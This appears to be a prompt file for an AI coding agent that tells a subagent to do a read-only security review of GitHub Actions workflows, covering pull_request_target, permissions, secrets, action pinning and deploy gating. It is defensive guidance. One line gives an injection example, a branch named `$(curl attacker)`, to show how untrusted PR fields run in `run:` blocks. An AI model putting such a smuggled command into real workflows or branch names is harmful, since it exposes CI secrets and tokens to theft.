---
description: Review GitHub Actions changes — triggers, permissions, secret exposure, pull_request_target risks, action pinning, caching, and deployment gating. Read-only.
argument-hint: '[workflow file or diff scope]'
---

Delegate to the **fg-workflow-reviewer** subagent: $ARGUMENTS

If no scope is given, review the diff under `.github/workflows` and `.github/actions`.

**Check `pull_request_target` first, every time.** `pull-request-automation.yml` uses it on `main` and `develop`. That trigger runs in the base repository's context, **with secrets and a write-capable token**, while the pull request's code is untrusted. Verify specifically:

- it does **not** check out the PR head and then execute anything from it — no dependency install with scripts, no script or action taken from the PR tree,
- it does **not** interpolate untrusted PR fields (`title`, `body`, `head.ref`, author login) directly into a `run:` block. A branch named `$(curl attacker)` executes. Pass them through `env:`,
- `permissions:` is the narrowest set the job needs,
- if it must build PR code, that belongs in a separate `pull_request` workflow **without** secrets.

If the job only labels or comments, say so — that is a legitimate use, and a false positive costs trust.

Then:

1. **Permissions** — an explicit top-level block defaulting to `contents: read`, widened per job only where needed.
2. **Secrets** — never echoed, never in a step name, never passed to an action that does not need them.
3. **Action pinning** — third-party actions pinned to a full SHA, not a moving tag. `grep -rn "uses: " .github/workflows/ | grep -v "@[0-9a-f]\{40\}"` lists the offenders.
4. **Deployment gating** — `deploy-vps.yml` fires on push to `main`: does it depend on CI passing rather than racing it? **Migrations in a deploy step deserve their own scrutiny** — two databases, and a deploy that runs one and not the other is a broken production.
5. **Caching** — keys include the `composer.lock` hash, so a dependency change invalidates them.
6. **Matrix and `needs:`** — real ordering, deliberate `fail-fast`, no silently skipped combination reporting success.
7. **The composite actions** — they run in every job that uses them; read them with equal suspicion.

Ask for findings ranked **critical → high → medium → low**, with any `pull_request_target` finding first. Require an explicit note that repository settings, environment protection rules, and secret values are not in the tree — a workflow that reads safe here can still be misconfigured in GitHub.
